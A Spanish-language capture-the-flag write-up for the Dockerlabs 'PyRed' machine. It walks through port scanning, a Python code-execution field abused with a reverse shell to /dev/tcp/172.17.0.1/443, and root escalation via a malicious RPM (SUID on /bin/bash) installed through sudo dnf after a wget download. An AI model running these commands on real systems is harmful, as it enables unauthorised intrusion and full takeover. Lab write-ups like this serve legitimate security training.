
# Writeup Template: Maquina `[ PyRed ]`

- Tags: #PyRed
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina PyRed](https://mega.nz/file/MHFl1JgS#HHZoCOv8d8Cne4AKUHRchI9IXGX-4OA2FjntN8QG7rw) 

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x pyred.zip
sudo bash auto_deploy.sh pyred.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p5000 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
5000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.12.2)
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2:5000/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2:5000/
http://172.17.0.2:5000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/3.0.2 Python/3.12.2], IP[172.17.0.2], Python[3.12.2], Werkzeug[3.0.2]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 5000 172.17.0.2 # No reporta nada critico
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
En la web principal tenemos un campo donde podemos ejecutar codigo, Y si no esta sanitizado nos podemos aprovechar de esto para ganar acceso al objetivo

### Ejecucion del Ataque
```python
# Comandos para explotación
saludo = "Hello World"
print(saludo)
```

Vemos que se logra ver la salida de la variable **saludo** en la respuesta. Ahora nos podremos en escucha para intentar ganar acceso con una **revershell**

### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
import os;
os.system("bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'")
```

---

## Escalada de Privilegios

###### Usuario `[ Primpi ]`:
Listando los permisos de este usuario tenemos lo siguiente:
```bash
sudo -l

(ALL) NOPASSWD: /usr/bin/dnf
```

Ahora nos aprovechamos de esto para ganar acceso como **root** y desde nuestra maquina atacante ejecutamos estos comandos para crear un archivo **.rpm** malicioso
```bash
# Comando para escalar al usuario: ( root )
TF=$(mktemp -d) # Primero ejecutamos este
echo 'chmod u+s /bin/bash' > $TF/x.sh # Despues ejecutamos este
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

Ahora este archivo lo transferiremos a la victima, Montamos un servidor python para que este disponilble nuestro archivo malicioso: **x-1.0-1.noarch.rpm**
```bash
python3 -m http.server 80
```

Ahora lo descargamos desde la maquina victima:
```bash
wget http://192.168.1.37/x-1.0-1.noarch.rpm
```

Ahora explotamos el privilegio:
```bash
sudo /usr/bin/dnf install -y x-1.0-1.noarch.rpm
```

Ahora solo lanzamos nuestra **bash** como **root**
```bash
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
whoami
root
```